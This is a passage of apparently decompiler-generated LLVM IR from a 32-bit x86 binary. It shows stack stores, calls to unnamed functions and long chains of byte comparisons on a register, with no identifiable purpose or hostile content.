  store i32 16384, i32* %v2_8050172, align 4
  %v1_8050177 = add i32 %v0_8050172, -8
  %v2_8050177 = inttoptr i32 %v1_8050177 to i32*
  store i32 4, i32* %v2_8050177, align 4
  %v1_8050179 = add i32 %v0_8050172, 1952
  store i32 %v1_8050179, i32* %ecx.global-to-local, align 4
  %v2_8050180 = add i32 %v0_8050172, -12
  %v3_8050180 = inttoptr i32 %v2_8050180 to i32*
  store i32 %v1_8050179, i32* %v3_8050180, align 4
  %v0_8050181 = load i32, i32* @ebp, align 4
  %v2_8050181 = add i32 %v0_8050172, -16
  %v3_8050181 = inttoptr i32 %v2_8050181 to i32*
  store i32 %v0_8050181, i32* %v3_8050181, align 4
  %v0_8050182 = call i32 @function_8051c16()
  %v0_8050187 = load i32, i32* @esp, align 4
  %v1_805018a = add i32 %v0_8050187, 28
  %v2_805018a = inttoptr i32 %v1_805018a to i32*
  store i32 16384, i32* %v2_805018a, align 4
  %v1_805018f = add i32 %v0_8050187, 24
  %v2_805018f = inttoptr i32 %v1_805018f to i32*
  store i32 2, i32* %v2_805018f, align 4
  %v1_8050191 = add i32 %v0_8050187, 1978
  store i32 %v1_8050191, i32* %eax.global-to-local, align 4
  %v2_8050198 = add i32 %v0_8050187, 20
  %v3_8050198 = inttoptr i32 %v2_8050198 to i32*
  store i32 %v1_8050191, i32* %v3_8050198, align 4
  %v0_8050199 = load i32, i32* @ebp, align 4
  %v2_8050199 = add i32 %v0_8050187, 16
  %v3_8050199 = inttoptr i32 %v2_8050199 to i32*
  store i32 %v0_8050199, i32* %v3_8050199, align 4
  %v0_805019a = call i32 @function_8051c16()
  store i32 %v0_805019a, i32* %eax.global-to-local, align 4
  %v0_805019f = load i32, i32* @esp, align 4
  %v1_805019f = add i32 %v0_805019f, -4
  %v2_805019f = inttoptr i32 %v1_805019f to i32*
  store i32 16384, i32* %v2_805019f, align 4
  %v1_80501a4 = add i32 %v0_805019f, -8
  %v2_80501a4 = inttoptr i32 %v1_80501a4 to i32*
  store i32 1, i32* %v2_80501a4, align 4
  %v1_80501a6 = add i32 %v0_805019f, 116
  %v2_80501a6 = inttoptr i32 %v1_80501a6 to i32*
  %v3_80501a6 = load i32, i32* %v2_80501a6, align 4
  %v1_80501aa = add i32 %v3_80501a6, 12
  store i32 %v1_80501aa, i32* %eax.global-to-local, align 4
  %v2_80501ad = add i32 %v0_805019f, -12
  %v3_80501ad = inttoptr i32 %v2_80501ad to i32*
  store i32 %v1_80501aa, i32* %v3_80501ad, align 4
  %v0_80501ae = load i32, i32* @ebp, align 4
  %v2_80501ae = add i32 %v0_805019f, -16
  %v3_80501ae = inttoptr i32 %v2_80501ae to i32*
  store i32 %v0_80501ae, i32* %v3_80501ae, align 4
  %v0_80501af = call i32 @function_8051c16()
  %v0_80501b4 = load i32, i32* @esp, align 4
  %v1_80501b7 = add i32 %v0_80501b4, 28
  %v2_80501b7 = inttoptr i32 %v1_80501b7 to i32*
  store i32 16384, i32* %v2_80501b7, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_80501be = add i32 %v0_80501b4, 132
  %v2_80501be = inttoptr i32 %v1_80501be to i32*
  %v3_80501be = load i32, i32* %v2_80501be, align 4
  store i32 %v3_80501be, i32* %edx.global-to-local, align 4
  %v1_80501c2 = add i32 %v3_80501be, 12
  %v2_80501c2 = inttoptr i32 %v1_80501c2 to i8*
  %v3_80501c2 = load i8, i8* %v2_80501c2, align 1
  %v4_80501c2 = zext i8 %v3_80501c2 to i32
  store i32 %v4_80501c2, i32* %eax.global-to-local, align 4
  %v2_80501c5 = add i32 %v0_80501b4, 24
  %v3_80501c5 = inttoptr i32 %v2_80501c5 to i32*
  store i32 %v4_80501c2, i32* %v3_80501c5, align 4
  %v0_80501c6 = load i32, i32* %edx.global-to-local, align 4
  %v1_80501c6 = inttoptr i32 %v0_80501c6 to i32*
  %v2_80501c6 = load i32, i32* %v1_80501c6, align 4
  store i32 %v2_80501c6, i32* %eax.global-to-local, align 4
  %v2_80501c8 = add i32 %v0_80501b4, 20
  %v3_80501c8 = inttoptr i32 %v2_80501c8 to i32*
  store i32 %v2_80501c6, i32* %v3_80501c8, align 4
  %v0_80501c9 = load i32, i32* @ebp, align 4
  %v2_80501c9 = add i32 %v0_80501b4, 16
  %v3_80501c9 = inttoptr i32 %v2_80501c9 to i32*
  store i32 %v0_80501c9, i32* %v3_80501c9, align 4
  %v0_80501ca = call i32 @function_8051c16()
  store i32 %v0_80501ca, i32* %eax.global-to-local, align 4
  %v0_80501cf = load i32, i32* @esp, align 4
  %v1_80501cf = add i32 %v0_80501cf, -4
  %v2_80501cf = inttoptr i32 %v1_80501cf to i32*
  store i32 16384, i32* %v2_80501cf, align 4
  %v1_80501d4 = add i32 %v0_80501cf, -8
  %v2_80501d4 = inttoptr i32 %v1_80501d4 to i32*
  store i32 1, i32* %v2_80501d4, align 4
  %v1_80501d6 = add i32 %v0_80501cf, 116
  %v2_80501d6 = inttoptr i32 %v1_80501d6 to i32*
  %v3_80501d6 = load i32, i32* %v2_80501d6, align 4
  %v1_80501da = add i32 %v3_80501d6, 13
  store i32 %v1_80501da, i32* %eax.global-to-local, align 4
  %v2_80501dd = add i32 %v0_80501cf, -12
  %v3_80501dd = inttoptr i32 %v2_80501dd to i32*
  store i32 %v1_80501da, i32* %v3_80501dd, align 4
  %v0_80501de = load i32, i32* @ebp, align 4
  %v2_80501de = add i32 %v0_80501cf, -16
  %v3_80501de = inttoptr i32 %v2_80501de to i32*
  store i32 %v0_80501de, i32* %v3_80501de, align 4
  %v0_80501df = call i32 @function_8051c16()
  %v0_80501e4 = load i32, i32* @esp, align 4
  %v1_80501e7 = add i32 %v0_80501e4, 28
  %v2_80501e7 = inttoptr i32 %v1_80501e7 to i32*
  store i32 16384, i32* %v2_80501e7, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_80501ee = add i32 %v0_80501e4, 132
  %v2_80501ee = inttoptr i32 %v1_80501ee to i32*
  %v3_80501ee = load i32, i32* %v2_80501ee, align 4
  store i32 %v3_80501ee, i32* %ecx.global-to-local, align 4
  %v1_80501f2 = add i32 %v3_80501ee, 13
  %v2_80501f2 = inttoptr i32 %v1_80501f2 to i8*
  %v3_80501f2 = load i8, i8* %v2_80501f2, align 1
  %v4_80501f2 = zext i8 %v3_80501f2 to i32
  store i32 %v4_80501f2, i32* %eax.global-to-local, align 4
  %v2_80501f5 = add i32 %v0_80501e4, 24
  %v3_80501f5 = inttoptr i32 %v2_80501f5 to i32*
  store i32 %v4_80501f2, i32* %v3_80501f5, align 4
  %v0_80501f6 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80501f6 = add i32 %v0_80501f6, 4
  %v2_80501f6 = inttoptr i32 %v1_80501f6 to i32*
  %v3_80501f6 = load i32, i32* %v2_80501f6, align 4
  store i32 %v3_80501f6, i32* %eax.global-to-local, align 4
  %v2_80501f9 = add i32 %v0_80501e4, 20
  %v3_80501f9 = inttoptr i32 %v2_80501f9 to i32*
  store i32 %v3_80501f6, i32* %v3_80501f9, align 4
  %v0_80501fa = load i32, i32* @ebp, align 4
  %v2_80501fa = add i32 %v0_80501e4, 16
  %v3_80501fa = inttoptr i32 %v2_80501fa to i32*
  store i32 %v0_80501fa, i32* %v3_80501fa, align 4
  %v0_80501fb = call i32 @function_8051c16()
  store i32 %v0_80501fb, i32* %eax.global-to-local, align 4
  %v0_8050200 = load i32, i32* @ebp, align 4
  %v1_8050200 = load i32, i32* @esp, align 4
  %v2_8050200 = inttoptr i32 %v1_8050200 to i32*
  store i32 %v0_8050200, i32* %v2_8050200, align 4
  %v1_8050203 = call i32 @function_80514e3(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050203, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ff43

dec_label_pc_8050210:                             ; preds = %dec_label_pc_80500ad
  %v0_805021a = load i32, i32* @esp, align 4
  %v1_805021d = add i32 %v0_805021a, -16
  %v2_805021d = inttoptr i32 %v1_805021d to i32*
  store i32 ptrtoint ([16 x i8]* @global_var_8053dd6.27 to i32), i32* %v2_805021d, align 4
  %v0_8050222 = call i32 @function_8051a9c()
  store i32 %v0_8050222, i32* %eax.global-to-local, align 4
  %v1_8050227 = load i32, i32* @esp, align 4
  %v2_8050227 = add i32 %v1_8050227, 1912
  %v3_8050227 = inttoptr i32 %v2_8050227 to i32*
  store i32 %v0_8050222, i32* %v3_8050227, align 4
  %v0_805022e = load i32, i32* @esp, align 4
  %v1_805022e = inttoptr i32 %v0_805022e to i32*
  %v2_805022e = load i32, i32* %v1_805022e, align 4
  store i32 %v2_805022e, i32* %eax.global-to-local, align 4
  %v3_805022e = add i32 %v0_805022e, 4
  %v1_805022f = inttoptr i32 %v3_805022e to i32*
  %v2_805022f = load i32, i32* %v1_805022f, align 4
  store i32 %v2_805022f, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_805022f, align 4
  store i32 2, i32* %v1_805022e, align 4
  %v0_8050234 = call i32 @function_8050940()
  %v1_8050234 = inttoptr i32 %v0_8050234 to i16*
  store i32 %v0_8050234, i32* %eax.global-to-local, align 4
  %v3_8050239 = load i16, i16* %v1_8050234, align 2
  %v4_8050239 = zext i16 %v3_8050239 to i32
  %v7_8050239 = and i32 %v0_8050234, -65536
  %v8_8050239 = or i32 %v4_8050239, %v7_8050239
  store i32 %v8_8050239, i32* %eax.global-to-local, align 4
  %v2_805023c = load i32, i32* @esp, align 4
  %v3_805023c = add i32 %v2_805023c, 1910
  %v4_805023c = inttoptr i32 %v3_805023c to i16*
  store i16 %v3_8050239, i16* %v4_805023c, align 2
  br label %dec_label_pc_804ff43

dec_label_pc_805024c:                             ; preds = %dec_label_pc_804f049
  %v0_805024c = load i32, i32* @ebx, align 4
  %v1_805024c = trunc i32 %v0_805024c to i8
  %tmp775 = icmp ugt i8 %v1_805024c, -12
  %v11_8050255 = icmp eq i8 %v1_805024c, -1
  %v1_8050258 = icmp eq i1 %v11_8050255, false
  %or.cond254 = and i1 %tmp775, %v1_8050258
  br i1 %or.cond254, label %dec_label_pc_804e2d1, label %dec_label_pc_804f08f.thread

dec_label_pc_8050263:                             ; preds = %dec_label_pc_804f049
  %v0_8050263 = load i32, i32* @ebx, align 4
  %v1_8050263 = trunc i32 %v0_8050263 to i8
  %v1_8050263.off = add i8 %v1_8050263, 74
  %tmp776 = icmp ult i8 %v1_8050263.off, 7
  br i1 %tmp776, label %dec_label_pc_804e2d1, label %dec_label_pc_804f08f.thread

dec_label_pc_805027a:                             ; preds = %dec_label_pc_804f022
  %v0_805027a = load i32, i32* @ebx, align 4
  %v1_805027a = trunc i32 %v0_805027a to i8
  %v1_805027a.off = add i8 %v1_805027a, -94
  %tmp777 = icmp ult i8 %v1_805027a.off, 15
  br i1 %tmp777, label %dec_label_pc_804e2d1, label %dec_label_pc_804f034

dec_label_pc_8050291:                             ; preds = %dec_label_pc_804f022
  %v0_8050291 = load i32, i32* @ebx, align 4
  %v1_8050291 = trunc i32 %v0_8050291 to i8
  %v1_8050291.off = add i8 %v1_8050291, 40
  %tmp778 = icmp ult i8 %v1_8050291.off, 15
  br i1 %tmp778, label %dec_label_pc_804e2d1, label %dec_label_pc_804f034

dec_label_pc_80502a8:                             ; preds = %dec_label_pc_804ef53
  %v0_80502a8 = load i32, i32* @ebx, align 4
  %v1_80502a8 = trunc i32 %v0_80502a8 to i8
  %v1_80502a8.off = add i8 %v1_80502a8, 97
  %tmp779 = icmp ult i8 %v1_80502a8.off, 24
  br i1 %tmp779, label %dec_label_pc_804e2d1, label %dec_label_pc_804ef5c

dec_label_pc_80502d6:                             ; preds = %dec_label_pc_804eff0, %dec_label_pc_804efe5
  %v10_80502d6 = icmp eq i8 %v1_804ede5, 79
  %v1_80502d9 = icmp eq i1 %v10_80502d6, false
  br i1 %v1_80502d9, label %dec_label_pc_804f002, label %dec_label_pc_80502df

dec_label_pc_80502df:                             ; preds = %dec_label_pc_80502d6
  %v0_80502df = load i32, i32* @ebx, align 4
  %v1_80502df = trunc i32 %v0_80502df to i8
  %v10_80502df = icmp eq i8 %v1_80502df, 121
  %tmp780 = and i1 %v7_8050583, %v10_80502df
  %or.cond261 = and i1 %v1_80508cb, %tmp780
  br i1 %or.cond261, label %dec_label_pc_804e2d1, label %dec_label_pc_804f002

dec_label_pc_80502fe:                             ; preds = %dec_label_pc_804f012
  %v8_8050307 = icmp eq i8 %v4_804e2e1, 96
  br i1 %v8_8050307, label %dec_label_pc_804e2d1, label %dec_label_pc_804f034

dec_label_pc_8050315:                             ; preds = %dec_label_pc_804ef35
  %v0_8050315 = load i32, i32* @ebx, align 4
  %v1_8050315 = trunc i32 %v0_8050315 to i8
  %v11_8050315 = icmp eq i8 %v1_8050315, -114
  %v4_804e2e1.off539 = add i8 %v4_804e2e1, 48
  %tmp781 = icmp ult i8 %v4_804e2e1.off539, 15
  %tmp782 = and i1 %tmp781, %v11_8050315
  br i1 %tmp782, label %dec_label_pc_804e2d1, label %dec_label_pc_804ef3e

dec_label_pc_805034c:                             ; preds = %dec_label_pc_804eefc
  %v0_805034c = load i32, i32* @ebx, align 4
  %v1_805034c = trunc i32 %v0_805034c to i8
  %v11_805034c = icmp eq i8 %v1_805034c, -36
  %v4_804e2e1.off542 = add i8 %v4_804e2e1, 84
  %tmp783 = icmp ult i8 %v4_804e2e1.off542, 3
  %tmp784 = and i1 %tmp783, %v11_805034c
  br i1 %tmp784, label %dec_label_pc_804e2d1, label %dec_label_pc_804ef05

dec_label_pc_80503df:                             ; preds = %dec_label_pc_804e717
  %v1_804e6fb.off = add i8 %v1_804e6fb, 79
  %tmp785 = icmp ult i8 %v1_804e6fb.off, 46
  br i1 %tmp785, label %dec_label_pc_804e2d1, label %dec_label_pc_804e72f

dec_label_pc_80503f6:                             ; preds = %dec_label_pc_804e717
  %v3_80503f6 = trunc i32 %v7_804e71a to i8
  %v4_80503f6 = icmp ne i8 %v3_80503f6, 0
  %tmp786 = icmp ult i8 %v1_804e6fb, -21
  %or.cond279 = and i1 %tmp786, %v4_80503f6
  br i1 %or.cond279, label %dec_label_pc_804e2d1, label %dec_label_pc_804e72f

dec_label_pc_805040c:                             ; preds = %dec_label_pc_804e6fb
  %tmp787 = icmp ult i8 %v1_804e6fb, -5
  %or.cond454 = and i1 %tmp787, %v4_805040c.not453
  br i1 %or.cond454, label %dec_label_pc_804e2d1, label %dec_label_pc_804e717.thread

dec_label_pc_8050422:                             ; preds = %dec_label_pc_804e6d8
  %v0_8050422 = load i32, i32* @ebx, align 4
  %v1_8050422 = trunc i32 %v0_8050422 to i8
  %v1_8050422.off = add i8 %v1_8050422, -40
  %tmp788 = icmp sgt i8 %v1_8050422.off, -1
  br i1 %tmp788, label %dec_label_pc_804e2d1, label %dec_label_pc_804e6fb

dec_label_pc_8050439:                             ; preds = %dec_label_pc_804e6d8
  %v0_8050439 = load i32, i32* @ebx, align 4
  %v1_8050439 = trunc i32 %v0_8050439 to i8
  %tmp789 = icmp ugt i8 %v1_8050439, 21
  %v11_8050442 = icmp eq i8 %v1_8050439, -1
  %v1_8050445 = icmp eq i1 %v11_8050442, false
  %or.cond281 = and i1 %tmp789, %v1_8050445
  br i1 %or.cond281, label %dec_label_pc_804e2d1, label %dec_label_pc_804e6fb

dec_label_pc_8050450:                             ; preds = %dec_label_pc_804e6d8
  %v0_8050450 = load i32, i32* @esp, align 4
  %v1_8050450 = add i32 %v0_8050450, 65
  %v2_8050450 = inttoptr i32 %v1_8050450 to i8*
  %v3_8050450 = load i8, i8* %v2_8050450, align 1
  %v4_8050450 = icmp eq i8 %v3_8050450, 0
  br i1 %v4_8050450, label %dec_label_pc_804e6fb, label %dec_label_pc_805045b

dec_label_pc_805045b:                             ; preds = %dec_label_pc_8050450
  %v0_805045b = load i32, i32* @ebx, align 4
  %v1_805045b = trunc i32 %v0_805045b to i8
  %tmp790 = icmp ult i8 %v1_805045b, -19
  br i1 %tmp790, label %dec_label_pc_804e2d1, label %dec_label_pc_804e6fb

dec_label_pc_8050469:                             ; preds = %dec_label_pc_804e673
  %v1_8050469 = add i32 %v0_8050469, 69
  %v2_8050469 = inttoptr i32 %v1_8050469 to i8*
  %v3_8050469 = load i8, i8* %v2_8050469, align 1
  %v4_8050469 = icmp eq i8 %v3_8050469, 0
  br i1 %v4_8050469, label %dec_label_pc_804e684, label %dec_label_pc_8050474

dec_label_pc_8050474:                             ; preds = %dec_label_pc_8050469
  %v0_8050474 = load i32, i32* @ebx, align 4
  %v1_8050474 = trunc i32 %v0_8050474 to i8
  %tmp791 = icmp ult i8 %v1_8050474, 127
  br i1 %tmp791, label %dec_label_pc_804e2d1, label %dec_label_pc_804e684

dec_label_pc_8050490:                             ; preds = %dec_label_pc_804e597
  %v1_8050490 = add i32 %v0_8050490, 78
  %v2_8050490 = inttoptr i32 %v1_8050490 to i8*
  %v3_8050490 = load i8, i8* %v2_8050490, align 1
  %v4_8050490 = icmp eq i8 %v3_8050490, 0
  %v1_8050495 = icmp eq i1 %v4_8050490, false
  br i1 %v1_8050495, label %dec_label_pc_804e2d1, label %dec_label_pc_804e5a8

dec_label_pc_80504a0:                             ; preds = %dec_label_pc_804e586
  %v1_80504a0 = add i32 %v0_80504a0, 79
  %v2_80504a0 = inttoptr i32 %v1_80504a0 to i8*
  %v3_80504a0 = load i8, i8* %v2_80504a0, align 1
  %v4_80504a0 = icmp eq i8 %v3_80504a0, 0
  %v1_80504a5 = icmp eq i1 %v4_80504a0, false
  br i1 %v1_80504a5, label %dec_label_pc_804e2d1, label %dec_label_pc_804e597

dec_label_pc_80504b0:                             ; preds = %dec_label_pc_804e528
  %v0_80504b0 = load i32, i32* @ebx, align 4
  %v1_80504b0 = trunc i32 %v0_80504b0 to i8
  %v10_80504b0 = icmp eq i8 %v1_80504b0, 9
  %v1_80504b3 = icmp eq i1 %v10_80504b0, false
  br i1 %v1_80504b3, label %dec_label_pc_804e531, label %dec_label_pc_804e2d1

dec_label_pc_80504be:                             ; preds = %dec_label_pc_804e4fd
  br i1 %v4_80504be, label %dec_label_pc_804e510, label %dec_label_pc_80504c9

dec_label_pc_80504c9:                             ; preds = %dec_label_pc_80504be
  %v0_80504c9 = load i32, i32* @ebx, align 4
  %v1_80504c9 = trunc i32 %v0_80504c9 to i8
  %v11_80504c9 = icmp ne i8 %v1_80504c9, -101
  %v11_80504d2 = icmp eq i8 %v1_80504c9, -78
  %v1_80504d5 = icmp eq i1 %v11_80504d2, false
  %or.cond285 = and i1 %v11_80504c9, %v1_80504d5
  br i1 %or.cond285, label %dec_label_pc_804e510, label %dec_label_pc_804e2d1

dec_label_pc_80504e0:                             ; preds = %dec_label_pc_804e4ba
  %v0_80504e0 = load i32, i32* @ebx, align 4
  %v1_80504e0 = trunc i32 %v0_80504e0 to i8
  %v10_80504e0 = icmp eq i8 %v1_80504e0, 124
  %v1_80504e3 = icmp eq i1 %v10_80504e0, false
  br i1 %v1_80504e3, label %dec_label_pc_804e4c3, label %dec_label_pc_804e2d1

dec_label_pc_80504ee:                             ; preds = %dec_label_pc_804e3d8
  %v1_80504ee = add i32 %v0_80504ee, 93
  %v2_80504ee = inttoptr i32 %v1_80504ee to i8*
  %v3_80504ee = load i8, i8* %v2_80504ee, align 1
  %v4_80504ee = icmp eq i8 %v3_80504ee, 0
  %v1_80504f3 = icmp eq i1 %v4_80504ee, false
  br i1 %v1_80504f3, label %dec_label_pc_804e2d1, label %dec_label_pc_804e3e9

dec_label_pc_80504fe:                             ; preds = %dec_label_pc_804e832
  %v0_80504fe = load i32, i32* @ebx, align 4
  %v1_80504fe = trunc i32 %v0_80504fe to i8
  %v1_80504fe.off = add i8 %v1_80504fe, -21
  %tmp792 = icmp ult i8 %v1_80504fe.off, 11
  br i1 %tmp792, label %dec_label_pc_804e2d1, label %dec_label_pc_804e83b

dec_label_pc_8050515:                             ; preds = %dec_label_pc_804e779
  %v0_8050515 = load i32, i32* @ebx, align 4
  %v1_8050515 = trunc i32 %v0_8050515 to i8
  %v1_8050515.off = add i8 %v1_8050515, -99
  %tmp793 = icmp ult i8 %v1_8050515.off, -102
  br i1 %tmp793, label %dec_label_pc_804e2d1, label %dec_label_pc_804e793

dec_label_pc_805052c:                             ; preds = %dec_label_pc_804e779
  %v0_805052c = load i32, i32* @esp, align 4
  %v1_805052c = add i32 %v0_805052c, 61
  %v2_805052c = inttoptr i32 %v1_805052c to i8*
  %v3_805052c = load i8, i8* %v2_805052c, align 1
  %v4_805052c = icmp eq i8 %v3_805052c, 0
  br i1 %v4_805052c, label %dec_label_pc_804e793, label %dec_label_pc_8050537

dec_label_pc_8050537:                             ; preds = %dec_label_pc_805052c
  %v0_8050537 = load i32, i32* @ebx, align 4
  %v1_8050537 = trunc i32 %v0_8050537 to i8
  %tmp794 = icmp ult i8 %v1_8050537, -23
  br i1 %tmp794, label %dec_label_pc_804e2d1, label %dec_label_pc_804e793

dec_label_pc_8050545:                             ; preds = %dec_label_pc_804e769
  %v1_8050545 = add i32 %v0_8050545, 62
  %v2_8050545 = inttoptr i32 %v1_8050545 to i8*
  %v3_8050545 = load i8, i8* %v2_8050545, align 1
  %v4_8050545 = icmp eq i8 %v3_8050545, 0
  br i1 %v4_8050545, label %dec_label_pc_804e779, label %dec_label_pc_8050550

dec_label_pc_8050550:                             ; preds = %dec_label_pc_8050545
  %v0_8050550 = load i32, i32* @ebx, align 4
  %v1_8050550 = trunc i32 %v0_8050550 to i8
  %tmp795 = icmp ult i8 %v1_8050550, -53
  br i1 %tmp795, label %dec_label_pc_804e2d1, label %dec_label_pc_804e779

dec_label_pc_805055e:                             ; preds = %dec_label_pc_804e8c4
  %v0_805055e = load i32, i32* @ebx, align 4
  %v1_805055e = trunc i32 %v0_805055e to i8
  %v1_805055e.off = add i8 %v1_805055e, 124
  %tmp796 = icmp ult i8 %v1_805055e.off, 19
  br i1 %tmp796, label %dec_label_pc_804e2d1, label %dec_label_pc_804e8cd

dec_label_pc_8050575:                             ; preds = %dec_label_pc_804e974
  %v0_8050575 = load i32, i32* @ebx, align 4
  %v1_8050575 = trunc i32 %v0_8050575 to i8
  %tmp797 = icmp ult i8 %v1_8050575, 118
  br i1 %tmp797, label %dec_label_pc_804e2d1, label %dec_label_pc_804e97d

dec_label_pc_80505dd:                             ; preds = %dec_label_pc_804eace
  %v0_80505dd = load i32, i32* @ebx, align 4
  %v1_80505dd = trunc i32 %v0_80505dd to i8
  %v11_80505dd = icmp eq i8 %v1_80505dd, -118
  %v4_804e2e1.off548 = add i8 %v4_804e2e1, -1
  %tmp798 = icmp ult i8 %v4_804e2e1.off548, 126
  %tmp799 = and i1 %tmp798, %v11_80505dd
  br i1 %tmp799, label %dec_label_pc_804e2d1, label %dec_label_pc_804ead7

dec_label_pc_8050612:                             ; preds = %dec_label_pc_804eb45
  %or.cond318 = and i1 %v7_8050583, %tmp697
  br i1 %or.cond318, label %dec_label_pc_804e2d1, label %dec_label_pc_804eb5b

dec_label_pc_8050628:                             ; preds = %dec_label_pc_804eb45
  %v4_804e2e1.off545 = add i8 %v4_804e2e1, -64
  %tmp800 = icmp ult i8 %v4_804e2e1.off545, 31
  br i1 %tmp800, label %dec_label_pc_804e2d1, label %dec_label_pc_804eb5b

dec_label_pc_805066b:                             ; preds = %dec_label_pc_804ece1
  %v0_805066b = load i32, i32* @ebx, align 4
  %v1_805066b = trunc i32 %v0_805066b to i8
  %v11_805066b = icmp eq i8 %v1_805066b, -5
  %notrhs544 = icmp ugt i8 %v4_804e2e1, 18
  %or.cond329.not = and i1 %notrhs544, %v11_805066b
  %v4_804e2e1.off166 = add i8 %v4_804e2e1, -19
  %tmp801 = icmp ult i8 %v4_804e2e1.off166, 2
  %or.cond332 = and i1 %tmp801, %or.cond329.not
  br i1 %or.cond332, label %dec_label_pc_804e2d1, label %dec_label_pc_804ecf3.thread

dec_label_pc_80506a2:                             ; preds = %dec_label_pc_804ecfd
  %.old337 = icmp ugt i8 %v4_804e2e1, 55
  %.old339 = or i8 %v4_804e2e1, 1
  %.old340 = icmp eq i8 %.old339, 57
  %or.cond343 = and i1 %.old337, %.old340
  br i1 %or.cond343, label %dec_label_pc_804e2d1, label %dec_label_pc_804ed13

dec_label_pc_80506b9:                             ; preds = %dec_label_pc_804ecfd
  %tmp802 = icmp ugt i8 %v4_804e2e1, 112
  %v4_804e2e1.off164 = add i8 %v4_804e2e1, -113
  %tmp803 = icmp ult i8 %v4_804e2e1.off164, 2
  %or.cond346 = and i1 %tmp802, %tmp803
  br i1 %or.cond346, label %dec_label_pc_804e2d1, label %dec_label_pc_804ed13

dec_label_pc_80506d0:                             ; preds = %dec_label_pc_804ec38
  %v1_80506d0 = add i32 %v0_80506d0, 45
  %v2_80506d0 = inttoptr i32 %v1_80506d0 to i8*
  %v3_80506d0 = load i8, i8* %v2_80506d0, align 1
  %v4_80506d0 = icmp eq i8 %v3_80506d0, 0
  %v1_80506d5 = icmp eq i1 %v4_80506d0, false
  br i1 %v1_80506d5, label %dec_label_pc_804e2d1, label %dec_label_pc_804ec49

dec_label_pc_80507d0:                             ; preds = %dec_label_pc_804edf8
  br i1 %v4_804edeb, label %dec_label_pc_804ee0b, label %dec_label_pc_80507d8

dec_label_pc_80507d8:                             ; preds = %dec_label_pc_80507d0
  %v0_80507d8 = load i32, i32* @ebx, align 4
  %v1_80507d8 = trunc i32 %v0_80507d8 to i8
  %v10_80507d8 = icmp eq i8 %v1_80507d8, 39
  %v1_80507db = icmp eq i1 %v10_80507d8, false
  br i1 %v1_80507db, label %dec_label_pc_804ee0b, label %dec_label_pc_804e2d1

dec_label_pc_80507fc:                             ; preds = %dec_label_pc_804edc7
  br i1 %v4_80507fc, label %dec_label_pc_804ede5, label %dec_label_pc_8050807

dec_label_pc_8050807:                             ; preds = %dec_label_pc_80507fc
  %v0_8050807 = load i32, i32* @ebx, align 4
  %v1_8050807 = trunc i32 %v0_8050807 to i8
  %v11_8050807 = icmp eq i8 %v1_8050807, -1
  %v1_805080a = icmp eq i1 %v11_8050807, false
  br i1 %v1_805080a, label %dec_label_pc_804ede5, label %dec_label_pc_804e2d1

dec_label_pc_8050815:                             ; preds = %dec_label_pc_804edbe
  %v0_8050815 = load i32, i32* @ebx, align 4
  %v1_8050815 = trunc i32 %v0_8050815 to i8
  %v10_8050815 = icmp eq i8 %v1_8050815, 105
  %v1_8050818 = icmp eq i1 %v10_8050815, false
  br i1 %v1_8050818, label %dec_label_pc_804edc7, label %dec_label_pc_804e2d1

dec_label_pc_8050823:                             ; preds = %dec_label_pc_804eda8
  br i1 %v4_8050823, label %dec_label_pc_804edbe, label %dec_label_pc_805082e

dec_label_pc_805082e:                             ; preds = %dec_label_pc_8050823
  %v0_805082e = load i32, i32* @ebx, align 4
  %v1_805082e = trunc i32 %v0_805082e to i8
  %v11_805082e = icmp eq i8 %v1_805082e, -69
  %v1_8050831 = icmp eq i1 %v11_805082e, false
  br i1 %v1_8050831, label %dec_label_pc_804edbe, label %dec_label_pc_804e2d1

dec_label_pc_805083c:                             ; preds = %dec_label_pc_804ed92
  br i1 %v4_805083c, label %dec_label_pc_804eda8, label %dec_label_pc_8050847

dec_label_pc_8050847:                             ; preds = %dec_label_pc_805083c
  %v0_8050847 = load i32, i32* @ebx, align 4
  %v1_8050847 = trunc i32 %v0_8050847 to i8
  %v10_8050847 = icmp eq i8 %v1_8050847, 33
  %v1_805084a = icmp eq i1 %v10_8050847, false
  br i1 %v1_805084a, label %dec_label_pc_804eda8, label %dec_label_pc_804e2d1

dec_label_pc_8050855:                             ; preds = %dec_label_pc_804ed77
  %v0_8050855 = load i32, i32* @ebx, align 4
  %v1_8050855 = trunc i32 %v0_8050855 to i8
  %v10_8050855 = icmp eq i8 %v1_8050855, 31
  %v1_8050858 = icmp eq i1 %v10_8050855, false
  br i1 %v1_8050858, label %dec_label_pc_804ed80, label %dec_label_pc_804e2d1

dec_label_pc_8050863:                             ; preds = %dec_label_pc_804ece1
  %v0_8050863 = load i32, i32* @ebx, align 4
  %v1_8050863 = trunc i32 %v0_8050863 to i8
  %v10_8050863 = icmp eq i8 %v1_8050863, 42
  %notrhs496 = icmp ugt i8 %v4_804e2e1, 72
  %or.cond393.not = and i1 %notrhs496, %v10_8050863
  %v4_804e2e1.off165 = add i8 %v4_804e2e1, -73
  %tmp804 = icmp ult i8 %v4_804e2e1.off165, 2
  %or.cond396 = and i1 %tmp804, %or.cond393.not
  br i1 %or.cond396, label %dec_label_pc_804e2d1, label %dec_label_pc_804ecf3.thread

dec_label_pc_80508b1:                             ; preds = %dec_label_pc_804ee0b
  %v0_80508b1 = load i32, i32* @ebx, align 4
  %v1_80508b1 = trunc i32 %v0_80508b1 to i8
  %v11_80508b1 = icmp eq i8 %v1_80508b1, -122
  %v1_80508b4 = icmp eq i1 %v11_80508b1, false
  br i1 %v1_80508b4, label %dec_label_pc_804ee14, label %dec_label_pc_804e2d1

; uselistorder directives
  uselistorder i32 %v0_8050863, { 1, 0 }
  uselistorder i32 %v0_805066b, { 1, 0 }
  uselistorder i8 %v1_8050439, { 1, 0 }
  uselistorder i8 %v1_805024c, { 1, 0 }
  uselistorder i32 %v0_8050234, { 0, 2, 1 }
  uselistorder i32 %v4_80501f2, { 1, 0 }
  uselistorder i32 %v4_80501c2, { 1, 0 }
  uselistorder i32 %v0_805010c, { 0, 2, 1 }
  uselistorder i64 %v8_80500fa, { 1, 0 }
  uselistorder i32 %v1_80500ed, { 1, 0 }
  uselistorder i32 %v0_804f56a, { 1, 0 }
  uselistorder i8 %v1_805001f, { 1, 0 }
  uselistorder i32 %v0_8050003, { 1, 0 }
  uselistorder i32 %v3_804ffd8, { 1, 0 }
